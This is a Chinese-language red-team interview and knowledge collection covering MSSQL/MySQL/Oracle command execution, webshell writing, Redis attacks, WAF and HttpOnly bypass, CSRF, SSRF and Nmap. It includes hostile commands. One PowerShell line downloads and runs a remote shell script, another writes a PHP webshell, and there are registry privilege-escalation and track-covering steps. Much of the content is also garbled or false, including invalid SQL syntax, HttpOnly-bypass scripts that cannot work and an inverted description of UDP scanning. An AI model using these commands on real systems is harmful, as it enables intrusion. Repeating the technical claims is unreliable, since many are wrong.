收集的一些安全方向的知识点，持续更新

## 攻防最常见问题

### **宏观题**

```
渗透的时候如何隐藏自己的身份
红队攻击流程概述
如何打点（入口权限快速获取）
打点一般会用什么漏洞
有没有内网渗透的经验？怎么渗透？如果拿下了边界层的某一个机器，如何对内网其他进行探测？
对于云安全的理解
虚拟机逃逸的理解
有没有绕过真实场景的WAF？
如何绕过基于语义检测的waf，比如雷池，阿里云waf等
IDS/IPS绕过？
不出网有什么方法，正向shell 方法除了reg之类的，还有什么？
fastjson 不出网
拿到root权限之后下一步的思路和方向？
分别说下linux、windows的权限维持？
Windows 不安全原因
Linux 的隧道搭建
HW三大洞
痕迹清除
有一台Windows机器你会做些什么
Linux下有哪些文件进行渗透时比较关注的，及文件权限问题
```

### **️细节题**

```
了解拟态防火墙吗，原理和绕过
webshell有system权限但无法执行命令，怎么办？
TrustedInstall权限的原理是什么？
有无了解过域前置和云函数的转发
DNS隧道和SMB隧道有没有了解过
有一台机器已经提权到system权限，知不知道一个方法不需要登录3389直接登录
Windows用户权限
3389 无法连接的几种情况
如何检测 iis 短文件名漏洞
如何判别web服务器是windows还是linux
分块传输绕 WAF 的原理
文件上传绕 WAF 的方式都有哪些
mssql 中，假设为 sa 权限，如何不通过xp_cmdshell执行系统命令 (**)
DLL 劫持，DLL 注入
如何防止 DLL 劫持
Bypass uac 技巧、方法、原理
windows2003 frp nps 为什么用不了
有杀软抓不到 hash 原因
有明文密码，密文密码你会做些啥
后台有一个进程，你需要找到他的程序执行文件，该怎么找
```

### **工具**

```markdown

msf 这个工具吗？假如现在有一个已经被我们用msf控制的机子（在metepreter>下了），该如何进行内网渗透呢？
msf 常用模块有哪些
简述MSF的模块和其作用
msf 和 cs 联动做过吗，介绍一下
msf里面的 sock4a 和 sock5 有什么区别
CS 常使用的功能有哪些
有使用 CS 做过免杀吗
CS 上线 Linux 一般你怎么做的？有了解过 CrossC2 吗
cs有无二开，cna脚本写过么
Nmap 端口扫描技术原理
Nmap、msf 半握手和全握手实现
mimikatz 会用来干什么
mimikatz 原理
mimikatz 的 windows 版本,高版本如何使用？
```



## web渗透
### 1. MSSQL如果XPCMDSHELL不能用怎么拿SHELL
差异备份写入webshell、日志备份写入getshell
sp_oacreate 提权、xp_regwrite提权、JobAgent提权、CLR提权、沙盒提权
#### 1. 使用sp_oacreate执行系统命令:
```plsql
EXEC sp_oacreate 'cmd', 'cmd';  
EXEC sp_oamethod @cmd='-c', @cmd_0= 'dir';
EXEC sp_oamethod @cmd='-c', @cmd_0= 'whoami';
EXEC sp_oamethod @cmd=NULL, @cmd_0=NULL;  
EXEC sp_oadestroy @cmd;
```

#### 2. 使用OPENROWSET读取文件内容执行命令:
```plsql
SELECT * FROM OPENROWSET('SQLNCLI', 'Server=127.0.0.1;Trusted_Connection=yes;', 
     'EXEC xp_cmdshell ''cmd.exe /c whoami''')
```
#### 3. 使用Linked Server连接另一个MSSQL服务器执行xp_cmdshell:
```plsql
EXEC ('xp_cmdshell ''whoami'' ') AT [linkedservername]
```
#### 4. 如果有权限的话可以直接执行扩展系统存储过程:
```plsql
EXEC xp_regread 
EXEC xp_dirtree
EXEC xp_subdirs
EXEC xp_fileexist
```
#### 5. 利用OLE Automation执行PowerShell脚本:
```plsql
DECLARE @shell INT;  
EXEC sp_OACreate 'wscript.shell', @shell OUT;   
EXEC sp_OASetProperty @shell, 'run', 'powershell -c "IEX (New-Object Net.WebClient).DownloadString( ́ ́http://ip/shell.ps1 ́ ́)"';   
EXEC sp_OAMethod @shell, 'run'; 
EXEC sp_OADestroy @shell;
```
#### 6.xp_regwrite提权
1. 首先检查是否有xp_regwrite和服务器本地管理员权限,如果没有则无法提权:
```plsql
EXEC xp_regread N'HKEY_LOCAL_MACHINE',N'SOFTWARE\Microsoft\MSSQLServer\MSSQLServer',N'LoginMode'
```
2. 找到MSSQL服务对应的registry项,如:
```plsql
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MSSQL$SQL2019 
```
3. 修改注册表项中`ObjectName`的值为`Administrator`,如:
```plsql
DECLARE @name NVARCHAR(512);
SET @name = N'Administrator';  
EXEC xp_regwrite N'HKEY_LOCAL_MACHINE', 
    N'SYSTEM\CurrentControlSet\Services\MSSQL$SQL2019',  
    N'ObjectName',   
    @name;
```
4. 重启MSSQL服务,然后就可以以`sa`帐号登录,同时具有`sysadmin`权限和服务器本地管理员权限。
5. (可选)再修改注册表将`ObjectName`改回 NT SERVICE\MSSQL$SQL2019防止他人发现。

#### 7.JobAgent提权

-  查找有权限创建作业的帐号,如`sa`
- 使用该帐号创建作业,指定作业owner为低权限用户
- 低权限用户可以修改和执行作为自己owner的作业,从而达到提权的目的

1. 创建作业的高权限用户:
```plsql
CREATE LOGIN newuser WITH PASSWORD = 'password'
CREATE USER newuser FOR LOGIN newuser
GRANT ALTER ANY JOB TO newuser
```
2. 新用户创建作业,指定OWNER为低权限用户:
```plsql
EXECUTE AS USER = 'newuser'
CREATE JOB DeleteTablesJob 
AS
DELETE * FROM sys.tables
OWNER = 'lowprivuser'  --指定OWNER为lowprivuser用户
```
3. 低权限用户可以修改并启动自己OWNER的作业:
```plsql
EXECUTE AS USER = 'lowprivuser'  --以lowprivuser用户执行
ALTER JOB DeleteTablesJob ENABLE  
```
4. 作业被启动,lowprivuser用户就完成了提权,可以删除sys.tables表等。

#### 8.CLR提权

-  先创建CLR组件,指定组件owner为`sa`等高权限用户
-  低权限用户调用作为owner的CLR组件,就可以执行高权限命令,实现提权

#### 9.沙盒提权

-  MSSQL中的沙盒机制可以限制SQL代码的执行权限
-  但是如果可以编写和执行CLR或Python等语言的代码,就可以绕过沙盒限制获取更高权限
-  这种利用CLR、Python等脚本语言来逃逸MSSQL沙盒限制的方法可以达到提权的目的


### 2. 不使用SQLMAP的OS-SHELL，各种数据库怎么写SHELL
[https://www.yuque.com/just0rg/gzlqo7/ui5wvo](https://www.yuque.com/just0rg/gzlqo7/ui5wvo)
#### 1. MSSQL WEBSHELL
```plsql
CREATE TABLE shell (cmd nvarchar(max))
go

INSERT INTO shell VALUES('whoami')
go

DECLARE @res NVARCHAR(MAX)
EXEC xp_cmdshell SELECT cmd FROM shell, @res output
SELECT @res

访问`http://xxx.com/shell.asp?id=1`,返回服务器用户名。


- 使用OPENROWSET读取远程文件:
SELECT * FROM OPENROWSET('SQLOLEDB','Server=ip;Trusted_Connection=yes;','EXEC master..xp_cmdshell ''command'' ')


- 使用LINKED SERVER执行远程命令:
EXEC ('xp_cmdshell ''whoami'' ') AT linkedservername  


- 使用格式化字符串(format string vulnerability)执行命令:
DECLARE @var VARCHAR(100)
SET @var = 'echo ' + CONVERT(VARCHAR(8000), HASHBYTES('MD5', '1'), 2) COLLATE SQL_Latin1_General_CP1_CI_AS
EXEC(@var)
```



#### 2. MySQL WEBSHELL
```plsql
CREATE TABLE `shell` ( `cmd` TEXT NOT NULL )

INSERT INTO `shell` VALUES('whoami');

SET @res = NULL; 
SELECT @res := `cmd` FROM `shell`;
SET @res = `\\\`\\\`\\\` + @res + `\\\`\\\`\\\`;
PREPARE x FROM @res; 
EXECUTE x;
DEALLOCATE PREPARE x;
SELECT @res;

访问`http://xxx.com/shell.php?id=1`,返回MySQL用户名。


- 使用USER变量执行命令:
SET @MYSQLUSER=USER();   
SET @res='';
SELECT @res:=@MYSQLUSER;
SET @cmd=CONCAT('whoami;');
PREPARE stmt FROM @cmd;
EXECUTE stmt;
SELECT @res;  


- 使用SELECT ... INTO OUTFILE写入WEBSHELL文件
SELECT '<?php phpinfo(); ?>'  INTO OUTFILE '/var/www/shell.php' 
```


#### 3. PostgreSQL WEBSHELL
```plsql
CREATE TABLE cmd(input text); 
INSERT INTO cmd VALUES('whoami');

CREATE or REPLACE FUNCTION sys_eval(IN sql text) RETURNS text AS 
$$ 
DECLARE 
  result text;
BEGIN
  EXECUTE sql INTO result;
  RETURN result;
END;
$$ language plpgsql;

SELECT sys_eval((SELECT input FROM cmd));
//访问`http://xxx.com/shell.php?id=1`,返回PostgreSQL用户名。
```


#### 4. Oracle WEBSHELL
```plsql
CREATE TABLE shell (cmd VARCHAR2(200));
INSERT INTO shell VALUES('HOST whoami');

DECLARE 
  output VARCHAR2(200);  
BEGIN
  EXECUTE IMMEDIATE 'BEGIN dbms_scheduler.run_job(''SHELLJOB'', NULL, TRUE); END;' USING OUT output;
  dbms_output.put_line(output); 
END;
/

- 使用UTL_HTTP访问外部URL执行命令:
BEGIN
UTL_HTTP.request('http://ip/shell.php?cmd=whoami');
END;  

- 使用SCHEDULER JOB执行OS命令:
BEGIN
DBMS_SCHEDULER.CREATE_JOB (
job_name => 'shelljob',
job_type => 'EXECUTABLE',
job_action => '/bin/bash',  
enabled => TRUE);
COMMIT;
END;  

- 使用DBMS_XSLPROCESSOR XML外部实体注入:
<!DOCTYPE x [ <!ENTITY % ext SYSTEM "file:///etc/passwd"> %ext; ]>   
<p>&#x25a0;</p> 
```
### 3. redis未授权， redis 怎么去做攻击，主从复制利用条件，为什么主从复制可以做到拿 shell，原理是什么，主从复制会影响业务吗，主从复制的原理是什么？  

**Redis未授权访问可进行如下攻击:**

1. 直接执行系统命令:使用 redis 客户端执行 config set dir /etc; config get dir 等命令读取系统文件;使用 eval "os.execute('whoami')" 0 执行系统命令。
2.  主从复制利用:redis 默认开启主从复制,可将恶意redis主服务器的地址添加到 redis.conf 的 slaveof 参数,使得目标 redis 成为恶意主服务器的从服务器,同步恶意数据。
3.  数据操纵:删除key 等操作破坏业务数据。

**主从复制利用条件:**

1.  目标 redis 开启主从复制功能(默认开启)
2.  攻击者控制一台 redis 主服务器
3.  目标 redis 可以连接到攻击者控制的redis 主服务器

**主从复制可以拿shell的原因:**

1.  redis主从复制是将主服务器上的所有数据(包括系统命令)同步到从服务器
2.   攻击者控制的redis 主服务器可写入恶意系统命令,这些命令会被同步到从服务器,从而实现在从服务器上执行命令的目的。

**主从复制会影响业务:**

1.  会同步删除目标 redis 中的业务数据KEY
2.  会在目标 redis 执行未知的系统命令,可能影响业务进程
3. 不会直接影响业务,操作都是再服务器上

**主从复制原理:**

1.  slave 启动成功连接到 master 后会发送 sync 命令,请求备份数据
2.  master 接收到 sync 命令,开始在后台保存数据变更记录(用于增量传输)
3.  master 同时启动后台进程,用于将整个数据集传输给 slave,slave 接收并保存
4.  全量数据传输完成后,master 持续将数据变更记录传给 slave,直到 slave 与 master 数据一致
5.  slave 定期向 master 发送 replconf 命令,确认主从关系并检查数据一致性

主从复制的原理是主 Redis 服务器将自己的状态持久化到本地磁盘，然后将持久化文件发送给从 Redis 服务器进行复制。主 Redis 服务器通过发送复制命令来通知从 Redis 服务器复制数据，并通过心跳机制来维护主从复制的状态。从 Redis 服务器接收到复制命令后，会请求主 Redis 服务器发送复制数据，主 Redis 服务器在收到请求后会将持久化文件中的数据发送给从 Redis 服务器。从 Redis 服务器接收到数据后，会根据接收到的数据进行相应的操作，并将状态信息发送给主 Redis 服务器，主 Redis 服务器会根据接收到的状态信息进行相应的处理。这样，主从复制的状态就得以保持一致。


### 4. 分块传输绕WAF的原理
> 分块传输绕过 WAF 的原理是利用 HTTP 协议支持分块传输的特性，将一个完整的 HTTP 报文分割成多个块（chunk），并将这些块分别发送给服务器，以此绕过 WAF 对完整 HTTP 报文的检测。

1.  HTTP请求中的Transfer-Encoding头指定为Chunked,表示请求体的数据以块的形式传输,而不是一整个完整的数据流。
2.  请求体由多个数据块组成,每个数据块前面会有块大小的标记,WAF无法得知整个请求体的大小和内容。
3.  WAF无法全面检测和匹配分块传输的请求数据,从而可能会产生绕过检测的机会。

**具体实现如下:**
1. 客户端发送HTTP请求,并在请求头中指定 Transfer-Encoding: chunked
2. 第一个数据块发送之前,需要发送该块的大小(十六进制),之后是一个CRLF,然后是数据块的实际内容,再次 CRLF
3. 每个后续块都遵循**相同的格式**:大小(16 进制)+ CRLF + 数据 + CRLF
4. 最后一个块的大小为 0,即两个 CRLF
5. 服务器会将所有的数据块内容与请求头一起解析,还原完整的请求数据

例如,要发送字符串 "Hello World!" ,可以分为两个数据块:
```http
POST /test HTTP/1.1
Host: test.com 
Transfer-Encoding: chunked

B
Hello 
C
World!
0

CRLF


- 第一个数据块大小为 B(11),内容为 Hello,后面为 CRLF
- 第二个数据块大小为 C(12),内容为 World!,后面为CRLF
- 最后一个空的数据块大小为 0,表示结束,后面为两个CRLF

```
所以利用分块传输编码可以构造看似正常的HTTP请求,但包含WAF难以检测的 payload, potnetially 绕过某些 WAF 对 SQL注入、XSS 等检测,需要对响应做额外解析。

> 通过分块传输绕过 WAF 的方法可以被用来绕过一些基于规则的 WAF，因为这些 WAF 可能只检测 HTTP 请求报文的特定部分，而忽略了 HTTP 报文块的内容。但这种方法并不能绕过所有的 WAF，因为一些高级的 WAF 可能会检测 HTTP 报文块的内容，并采取相应的防御措施。因此，攻击者在使用分块传输绕过 WAF 的时候，需要根据具体情况选择合适的攻击方式，并针对不同的 WAF 采取不同的绕过策略。



### 5. 文件上传绕WAF的方式都有哪些
[https://www.yuque.com/just0rg/gzlqo7/mygncr](https://www.yuque.com/just0rg/gzlqo7/mygncr)
### 6. sql注入绕WAF的方式
> 1. 利用特殊字符：在注入语句中使用特殊字符，如空格、单引号、双引号、注释符号等，来绕过 WAF 的检测。还可以使用编码、URL 编码等技术来混淆特殊字符，以此绕过 WAF。
> 2. 利用字符串拼接：在注入语句中使用字符串拼接，将 SQL 语句拆成多个短语，并使用字符串拼接将它们连接起来，以此绕过 WAF。
> 3. 利用子查询：通过嵌套子查询，在 SELECT 语句中间执行其他 SQL 语句，以此绕过 WAF 对于 SQL 语句长度的限制。
> 4. 利用 HTTP 请求头：通过在 HTTP 请求头中设置特定的参数，将 SQL 注入语句拆分成多个部分，绕过 WAF 的检测。
> 5. 利用错误信息：通过引发 SQL 错误，获取数据库的错误信息，从而绕过 WAF 的检测。
> 6. 利用时间延迟：在注入语句中加入时间延迟，如使用 sleep() 函数或其他等待操作，以此绕过 WAF 的检测。
> 
需要注意的是，这些方法并不能绕过所有的 WAF，因为 WAF 的检测方式和规则可能会不断更新和改进。因此，攻击者在进行 SQL 注入绕过 WAF 的时候，需要根据具体情况选择合适的攻击方式，并时刻关注 WAF 的更新情况，以及采取相应的绕过策略。同时，企业也应该加强安全意识教育和技术防御手段，提高防御能力。

[https://www.yuque.com/just0rg/gzlqo7/uyaze9ya6xsg7qox](https://www.yuque.com/just0rg/gzlqo7/uyaze9ya6xsg7qox)

### 7. FUZZ绕WAF的Payload长度通常是多少

1.  过长的Payload容易被WAF标记为异常流量阻断,不利于绕过WAF。
2.  过短的Payload难以构造出可以绕过WAF的规则,效果不明显。
3.  中等长度的Payload既不容易被直接阻断,也可以包含足够的信息以探测WAF规则,所以比较适合FUZZ。

根据经验,FUZZ绕WAF的Payload长度通常在50到500个字符之间,最适合的长度区间在**200到400**字符。
### 8. Java反射机制会导致怎样的安全问题
> Java 反射机制可以使得 Java 程序在运行时动态地获取类信息、对象实例、方法、属性等，并调用其相关方法，这为开发者提供了更大的灵活性，但也会导致一些安全问题，如下所示：
> 1. 代码注入攻击：攻击者可以使用反射机制在程序运行时动态地修改代码，使其执行恶意操作，如修改数据库信息、获取敏感信息等。
> 2. 访问控制问题：反射机制可以绕过访问控制机制，使得攻击者可以访问本来不应该被访问到的对象或方法。
> 3. 类型转换问题：Java 反射机制可以动态地创建对象实例并调用方法，但这也意味着攻击者可以创建任意类型的对象并调用其中的方法，从而造成类型转换问题，如整数转换为字符串等。
> 4. 安全管理问题：Java 反射机制可以绕过安全管理器，使得攻击者可以在没有相应权限的情况下访问受保护的资源或执行敏感操作。
> 
因此，在使用 Java 反射机制时，需要谨慎考虑安全问题，避免程序被攻击者利用，可以采取一些措施，如使用安全沙箱、限制反射的使用权限等来提高程序的安全性。同时，在编写代码时也要注意遵循安全编码的最佳实践，如输入验证、错误处理等，以尽量减少程序的漏洞。

### 9. CSRF_TOKEN的位置以及原理和绕过
> 它的原理是在发起表单提交或者 AJAX 请求时，服务端会在 HTTP 响应中返回一个随机生成的 token（一般放在 Cookie 中或者以隐藏字段的形式放在表单中），客户端在下次请求时需要携带这个 token，服务端会验证 token 的合法性，如果不合法则拒绝请求。
> CSRF_TOKEN 的位置：
> 1. 放在 Cookie 中：这种方式简单易用，可以适用于所有的表单和 AJAX 请求，但是存在 XSS 漏洞时，攻击者可以通过 JavaScript 读取到 token，从而进行 CSRF 攻击。
> 2. 放在表单中：这种方式比较安全，可以有效避免 XSS 攻击带来的安全问题，但是对于 AJAX 请求，需要将 token 以自定义 HTTP Header 的形式添加到请求中。
> 
CSRF_TOKEN 的绕过：
> 1. **通过 XSS 攻击获取 token**：如果网站存在 XSS 漏洞，攻击者可以通过注入恶意脚本获取 token，从而进行 CSRF 攻击。
> 2. **预测 token**：如果 token 是可预测的，攻击者可以通过猜测 token 的值进行 CSRF 攻击。
> 3. **利用第三方网站**：攻击者可以诱导用户在第三方网站上点击链接或者打开网页，使得用户在已经登录的情况下访问受害网站，从而进行 CSRF 攻击。
> 4. **利用 GET 请求**：如果服务端在 GET 请求中也携带 token，攻击者可以通过构造恶意链接进行 CSRF 攻击。
> 
为了避免 CSRF 攻击，除了采用 CSRF_TOKEN 技术之外，还可以采取其他措施，如：验证 HTTP Referer 头、限制请求的来源 IP、使用验证码等。同时，在编写代码时也要注意遵循安全编码的最佳实践，如输入验证、错误处理等，以尽量减少程序的漏洞。

### 10. Nmap常见扫描方式的原理以及NSE脚本原理

1. TCP SYN扫描
>  SYN扫描的原理是向目标主机的目标端口发送一个SYN包，如果目标端口是开放的，则目标主机会返回一个SYN/ACK包；如果目标端口是关闭的，则目标主机会返回一个RST包。Nmap利用这种响应的差异来确定目标端口的状态。  

2. UDP扫描
>  UDP扫描是用来探测目标主机上的UDP端口是否处于开放状态的一种扫描方式。UDP协议是无连接的，因此UDP扫描需要发送一些特定的数据包来触发目标主机的响应。如果目标端口是开放的，则目标主机会返回一个ICMP端口不可达的响应；如果目标端口是关闭的，则目标主机不会有任何响应。  

3. TCP Connect扫描
> TCP Connect扫描是另一种常用的扫描方式，它利用TCP协议中的三次握手来探测目标主机的开放端口。TCP Connect扫描的原理是通过建立一个TCP连接来探测目标主机的端口是否处于开放状态。如果目标端口是开放的，则连接会成功建立；如果目标端口是关闭的，则连接会失败。相比TCP SYN扫描，TCP Connect扫描更加可靠，但也更容易被目标主机检测到。


4. OS检测
> OS检测是一种用来确定目标主机所使用操作系统的扫描方式。它利用了操作系统在处理网络数据包时的一些特征，如TCP/IP协议栈的实现方式、默认的TCP/IP参数、支持的网络协议和服务等。Nmap使用一些已知的特征和指纹库来比对目标主机的响应，从而确定其所使用的操作系统。

5. NSE脚本
> NSE（Nmap Scripting Engine）是Nmap扫描器的一个核心功能，它允许用户在扫描中运行自定义脚本，自动执行诸如端口扫描、漏洞扫描、服务识别等任务。
> NSE脚本是基于Lua编写的，它们通过Nmap引擎自动执行，可以通过命令行参数或Nmap脚本引擎控制文件来选择或自定义需要执行的脚本。
> 
> NSE脚本的工作原理如下：
> 1. Nmap扫描器在扫描过程中加载所选的NSE脚本。
> 2. 对于每个扫描到的主机和端口，Nmap引擎调用脚本。
> 3. 脚本通过发送自定义的网络请求，分析响应，进行端口扫描、服务识别、漏洞扫描等任务。
> 4. 脚本根据扫描结果生成报告，包括主机信息、开放的端口和服务以及漏洞发现等。
> 
NSE脚本的工作原理类似于一个小型的漏洞扫描器，可以发现网络上存在的漏洞，还可以提供有用的信息，例如网络拓扑图、操作系统信息、开放端口等。
> 常见的NSE脚本包括HTTP扫描、FTP扫描、SMB扫描、漏洞扫描、Web应用程序扫描、SSL证书分析等。由于NSE脚本具有高度的可定制性，安全研究人员可以编写自己的脚本，以帮助发现特定的漏洞或提供有用的信息。



### 11. 不同域名怎样通过CSRF拿Cookie
> 1. 伪造跨域请求：攻击者可以构造一个恶意站点，向目标站点发送伪造的跨域请求。当用户登录目标站点并访问恶意站点时，恶意站点将向目标站点发送伪造请求，以执行攻击者想要的非法操作。攻击者可以在请求中包含一些隐藏的表单或URL参数，以便在执行请求时将用户的Cookie发送到攻击者的服务器。
> 2. 利用iframe：攻击者可以将一个隐藏的iframe添加到恶意站点上，iframe中的内容会向目标站点发送请求，从而执行非法操作。攻击者可以通过JavaScript代码修改iframe的内容，并使用表单提交、XMLHttpRequest等技术发送请求，以此来获取用户的Cookie。
> 3. 利用图片、链接等资源：攻击者可以在恶意站点上包含一些图像、链接或其他类型的资源，这些资源会向目标站点发送请求，从而执行非法操作。攻击者可以在这些资源的URL参数中包含一些隐藏的表单或其他参数，以便在执行请求时将用户的Cookie发送到攻击者的服务器。

 为了防止CSRF攻击，应用程序应该使用CSRF令牌来验证请求是否来自合法的用户。在应用程序中，服务器会生成一个唯一的CSRF令牌，并将其包含在表单或URL参数中。当用户提交表单或单击链接时，应用程序将检查请求中的CSRF令牌是否与服务器生成的令牌匹配。如果不匹配，则应用程序将拒绝请求，并防止攻击者利用CSRF攻击来获取用户的Cookie。  
### 12. CSRF怎么拿到Cookie
> 1. 首先，攻击者需要准备一个针对受害者网站的恶意网站，该网站中包含了一个构造好的 CSRF 攻击代码。
> 2. 当受害者在浏览器中访问攻击者构造的网站时，页面会加载包含 CSRF 攻击代码的 HTML 页面。
> 3. CSRF 攻击代码中，会利用一些诱导性的手段来引导用户执行某些操作，如点击链接、提交表单等。在执行这些操作的过程中，用户的浏览器会自动发出跨站点请求。
> 4. 受害者在执行这些操作的同时，其浏览器会自动携带保存在本地的 Cookie 信息，作为认证凭据发送到目标网站。由于 CSRF 攻击代码是在攻击者控制的网站上运行的，因此攻击者就能够获取到受害者的 Cookie 信息。
> 5. 一旦攻击者获取到受害者的 Cookie 信息，就可以在不需要登录的情况下，以受害者的身份进行恶意操作。
> 
需要注意的是，如果目标网站对 Cookie 做了一些安全限制，比如设置了 HttpOnly 属性、Secure 属性等，攻击者就不能通过简单的方式来获取受害者的 Cookie。但是，攻击者仍然可以通过一些高级的技巧来绕过这些限制，例如使用 XSS 攻击等手段。因此，在开发应用程序时，一定要注意对应用程序的安全性进行全面的测试和评估，避免出现这样的漏洞。

### 13. HTTP-Only绕过
> HTTP Only Cookie 的本质就是让 Cookie 不在 JavaScript 环境中可读,以防止 XSS 攻击通过 JavaScript 直接访问 Cookie
> xss绕过http-only：

> 1. 利用 XSS 攻击中的 DOM 操作：虽然 HTTP-Only 标记可以防止 JavaScript 代码直接读取 Cookie，但是如果攻击者可以利用 DOM 操作（如 document.cookie）修改页面的 HTML 或者页面中的 JavaScript 代码，从而实现恶意代码读取 HTTP-Only Cookie 的目的。
> 2. 利用 XSS 攻击中的请求转发：攻击者可以通过恶意的 JavaScript 代码将受害者的 Cookie 信息发送到攻击者的服务器，从而绕过 HTTP-Only 标记。攻击者通常可以使用一些隐藏的 iframe 或者 image 标签将受害者的 Cookie 发送到攻击者的服务器。
> 3. 利用 XSS 攻击中的本地存储：一些现代浏览器支持 HTML5 中的本地存储机制，如 localStorage 和 sessionStorage。这些本地存储机制可以在不受 HTTP-Only 标记的限制下，存储受害者的 Cookie 信息。因此，如果攻击者可以通过 XSS 攻击注入恶意 JavaScript 代码，就可以将受害者的 Cookie 信息存储在本地存储中。


1. 登录XSS漏洞页面,利用JavaScript发送XMLHttpRequest请求当前页面,这个请求会自动携带Cookie,我们可以在回调函数中读取返回数据获取Cookie值。
```javascript
var xhr = new XMLHttpRequest();
xhr.open("GET", window.location.href);
xhr.onreadystatechange = function() {
  if (xhr.readyState == 4 && xhr.status == 200) {
    var cookies = xhr.getResponseHeader("Set-Cookie");
    // 这里的cookies即为HTTP Only Cookie的值
  }
}
xhr.send(); 
```

2. 利用JavaScript在XSS漏洞页面创建一个image标签,设置src为当前页面URL,这个请求同样会自动携带Cookie,我们可以在onerror回调函数中获取请求的URL,从中解析出Cookie值。
```javascript
var img = document.createElement("img");
img.src = window.location.href;
img.onerror = function() {
  var cookie = this.src.split(";")[0].split("=")[1];
  // 这里的cookie即为HTTP Only Cookie的值
}
document.body.appendChild(img);
```


3. 利用JavaScript在XSS漏洞页面设置iframe, contenWindow.location加载当前页面URL,这个请求也会携带Cookie,我们可以在iframe页面通过JavaScript读取document.cookie获取Cookie值。
```javascript
var iframe = document.createElement("iframe");
iframe.src = window.location.href;
iframe.onload = function() {
    var cookie = iframe.contentWindow.document.cookie;
    // 这里的cookie即为HTTP Only Cookie的值
}
document.body.appendChild(iframe);
```
以上方法原理都是通过让客户端浏览器自动发起对当前页面的请求,这个请求会自动携带HTTP Only Cookie,然后我们通过各种方式解析和获取这个Cookie值,达到绕过HTTP Only属性的目的。


### 14. SSRF->redis未授权->getshell
[https://www.cnblogs.com/-chenxs/p/11749367.html](https://www.cnblogs.com/-chenxs/p/11749367.html)
### 15. 基于语义分析的WAF了解吗
> 基于语义分析的WAF（Web Application Firewall）是一种新兴的WAF技术，主要是利用自然语言处理和机器学习等技术对Web请求进行语义分析和判断，从而更准确地识别和阻止恶意请求。
> 这种WAF技术相比传统的基于正则表达式和规则的WAF更加智能化和精准化，因为它不仅可以识别简单的攻击模式，还可以检测一些语义上的问题，比如SQL注入语句、XSS攻击等。
> 基于语义分析的WAF一般使用机器学习算法进行模型训练和预测，它通过对大量的正常请求和恶意请求进行分析，自动学习出请求的特征和模式，从而对未知请求进行分类和判断。这种WAF技术需要较大的数据集和计算资源支持，但在面对新型攻击和0day漏洞时有更好的效果。
> 目前，基于语义分析的WAF已经逐渐成为WAF领域的主流技术之一，一些商业WAF厂商和开源WAF项目已经开始使用这种技术来提升其防御能力。

这种WAF的工作原理是:
1. 分析请求中Payload的语义,理解用户的输入意图,是否存在 Potentially 造成威胁的动作,如SQL注入、XSS等。
2. 不再通过简单的特征匹配来检测攻击,而是判断用户输入的语义和预期的应用语义是否匹配,如果不匹配则可判定为异常请求。
3. 结合上下文环境判断Payload的危险性,可有效防御某些利用上下文拼凑攻击字符串的手法。
4. 基于自然语言理解,可以模拟出正常请求的语义特征,用来检测异常请求。
比如,正常的SQL查询语句遵循这样的语义:
1. 查询目标:select 字段 from 表
2. 条件过滤:where 条件
3. 排序:order by 字段
4. 分页:limit offset, count
而SQL注入的Payload显然违反了这样的语义,所以可以被检测出来。
相比传统WAF,基于语义分析的WAF有以下优势:
1. 更高的检测准确性,减少误报,仅匹配真正的威胁请求。
2. 不依赖简单特征匹配,更难被直接绕过。
3. 可理解利用上下文构造的Payload,提高检测效果。
4. 可以自学习和泛化,探测0day攻击。
但是,这种WAF也面临一定挑战:
1. 语义分析技术难度大,规则复杂。
2. 需要大量语义数据和上下文来训练模型,难以覆盖所有应用场景。
3. 解析理解能力有限,仍可能被非典型Payload误导。
4. 部署和维护成本高,不如传统特征型WAF简单易用。
所以,基于语义分析的WAF是一种很有前景的技术方向,但还需要进一步提高其语义理解和检测能力,并降低部署难度,才能真正应用于实战。它有潜力取代传统的特征匹配WAF,成为应用安全防御的新标准。 
### 16. ssrf的绕过和防御
> **绕过：**
> 1. 使用IP地址代替URL：在某些情况下，应用程序可能只检查URL中的主机名而不检查IP地址，因此攻击者可以使用IP地址代替URL。
> 2. 带有非标准端口的URL：类似于使用IP地址，某些应用程序可能只检查URL中的主机名和端口号是否正确，攻击者可以使用带有非标准端口的URL。
> 3. 使用短地址服务：攻击者可以使用短地址服务，例如bit.ly或goo.gl，将恶意URL转换为短URL，这样就可以绕过SSRF防御机制。
> 4. DNS重绑定攻击：攻击者可以使用DNS重绑定攻击，通过在攻击者控制的DNS服务器上设置恶意域名的不同IP地址，来绕过SSRF防御机制。
> 5. URL编码：攻击者可以使用URL编码来绕过SSRF防御机制，例如使用%20代替空格。

> **防御：**
> 1. 验证URL：应用程序应该验证所有的URL参数，确保它们指向应用程序预期的位置，而不是攻击者控制的位置。
> 2. 使用白名单：可以使用白名单来限制应用程序可以访问的URL和IP地址，以减少攻击面。
> 3. 禁止重定向：应用程序应该禁止重定向到任意URL，因为攻击者可以使用重定向来绕过SSRF防御机制。
> 4. 使用随机端口：应用程序可以使用随机端口来减少攻击面，因为攻击者无法预测使用的端口号。
> 5. 使用安全的DNS解析：应用程序应该使用安全的DNS解析来防止DNS重绑定攻击。
> 6. 使用HTTP响应头：可以使用HTTP响应头来防止浏览器将应用程序的响应重定向到攻击者控制的位置。

### 17. fortity等代码审计工具原理

> Fortify是一款静态代码分析工具，其原理是通过扫描代码文件，识别代码中的漏洞和安全问题，包括常见的注入漏洞、跨站脚本漏洞、文件包含漏洞等等。Fortify使用了多种技术进行代码分析，包括抽象语法树（AST）分析、数据流分析、控制流分析、符号执行等等。
> 具体来说，Fortify分析过程分为三个步骤：
> 1. 扫描代码文件，生成抽象语法树（AST）和控制流图（CFG）。
> 2. 对AST和CFG进行数据流分析，识别代码中的漏洞和安全问题，并对问题进行分类和评级。
> 3. 对识别出的问题进行报告，包括问题类型、影响范围、代码位置和建议的修复方法。
> 
Fortify支持多种编程语言，包括Java、C/C++、.NET等。它还提供了集成开发环境（IDE）插件，以便开发人员可以在开发过程中自动检查代码，并及时修复问题。
> 除了Fortify，还有其他很多静态代码分析工具，如Coverity、Checkmarx等，它们的原理也类似。静态代码分析工具可以帮助开发人员在开发过程中及时发现和修复安全问题，提高代码的安全性和可靠性。

### 18. 存储过程角度讲讲预编译的原理
> 存储过程是预先定义好的一系列SQL语句的集合，通常用于完成复杂的数据操作。存储过程中的SQL语句是预编译的，这意味着在执行存储过程之前，这些SQL语句已经被编译成计算机可以执行的指令。

1.  编译与执行分离:存储过程在创建时将SQL语句编译成二进制可执行形式,执行时直接调用可执行形式,无需再次编译。这节省了每次执行的编译开销,提高了执行效率。
